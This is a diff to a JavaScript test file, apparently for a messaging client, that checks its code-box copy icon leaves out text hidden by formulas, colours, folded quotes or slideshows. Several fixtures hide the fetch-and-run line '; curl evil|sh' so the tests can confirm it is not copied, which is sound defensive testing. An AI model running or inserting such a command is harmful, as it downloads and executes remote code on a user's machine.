@@ -661,7 +661,8 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
   });
   check('the copy icon leaves out a spoiler in a spoiler unless both are open', JSON.stringify(nested) === JSON.stringify(['ls a', 'ls', 'ls a; curl evil|sh']), JSON.stringify(nested));
 
-  // what a formula moves out of the code box, what a folded quote cuts off after its third line, the slides not in
+  // what a formula moves out of the code box, what a folded quote cuts off after its third line (its text is a
+  // paragraph of the quote, so an empty line sets it apart from the code around), the slides not in
   // view and text a formula draws in the colour of what is behind it are not seen, so not copied (issue #206). What
   // the code box scrolls to, a long line, is seen
   const moved = [
@@ -671,8 +672,8 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
     ['<pre>ls<tg-math-block>\\mathllap{\\kern{-200em}\\text{; curl evil|sh}}</tg-math-block></pre>', 'ls'],
     ['<pre>ls<tg-math>\\color{white}{; curl evil|sh}</tg-math></pre>', 'ls'],
     ['<pre>ls<tg-math>\\colorbox{black}{\\textcolor{black}{; curl evil|sh}}</tg-math></pre>', 'ls'],
-    ['<pre>ls<blockquote expandable>1\n2\n3\n4\n; curl evil|sh</blockquote></pre>', 'ls\n1\n2\n3\n'],
-    ['<pre>ls<blockquote expandable>1<br>2<br>3<br>4<br>; curl evil|sh</blockquote></pre>', 'ls\n1\n2\n3\n'],
+    ['<pre>ls<blockquote expandable>1\n2\n3\n4\n; curl evil|sh</blockquote></pre>', 'ls\n\n1\n2\n3\n'],
+    ['<pre>ls<blockquote expandable>1<br>2<br>3<br>4<br>; curl evil|sh</blockquote></pre>', 'ls\n\n1\n2\n3\n'],
     ['<pre>ls<tg-slideshow><b>один</b><b>; curl evil|sh</b></tg-slideshow></pre>', 'ls\nодин'],
     ['<pre>ls' + ' '.repeat(300) + '; длинная строка</pre>', 'ls' + ' '.repeat(300) + '; длинная строка'],
     ['<pre>a <tg-math>\\color{gray}{b}+\\colorbox{black}{\\textcolor{white}{c}}</tg-math></pre>', 'a b+c'],
@@ -743,7 +744,7 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
     return [before, after, dark];
   });
   check('the copy icon copies an unfolded quote whole, the slide in view and white on the night theme',
-    JSON.stringify(shownNow) === JSON.stringify(['ls\n1\n2\n3\n\nодин', 'ls\n1\n2\n3\n4\n5\nдва', 'ls\n1\n2\n3\n4\n5\nдва\nx']), JSON.stringify(shownNow));
+    JSON.stringify(shownNow) === JSON.stringify(['ls\n\n1\n2\n3\n\n\nодин', 'ls\n\n1\n2\n3\n4\n5\n\nдва', 'ls\n\n1\n2\n3\n4\n5\n\nдва\nx']), JSON.stringify(shownNow));
   // a fraction is read from the top, as it is seen: \frac{a}{b} was copied as «ba» (issue #206)
   const frac = [];
   for (const rm of [{ html: '<pre>x=<tg-math>\\frac{a}{b}</tg-math></pre>' }, { blocks: [{ type: 'pre', text: ['x=', { type: 'mathematical_expression', expression: '\\frac{a}{b}' }] }] }]) frac.push((await copies(rm))[0]?.copied);
